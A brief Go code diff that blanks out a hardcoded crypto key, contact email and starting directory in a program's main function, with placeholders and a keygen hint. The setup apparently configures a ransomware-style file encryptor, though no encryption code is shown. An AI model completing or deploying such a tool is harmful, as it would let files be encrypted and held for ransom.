@@ -13,9 +13,9 @@ import (
 )
 
 func main() {
-	cryptoKey := "16379a3da689dff87ff6ac71fd8abebcd4261c596fdf7a027aa32196c371372d" // Insert generated Key
-	contact := "test@test.com"                                                      // Insert contact email
-	dir := "/Downloads/Test"                                                        // Insert starting directory
+	cryptoKey := "" // Insert generated Key
+	contact := ""   // Insert contact email
+	dir := ""       // Insert starting directory
 
 	if cryptoKey == "" {
 		panic("need crypto key! \nrun 'go run keygen/main.go' to get a crypto key")
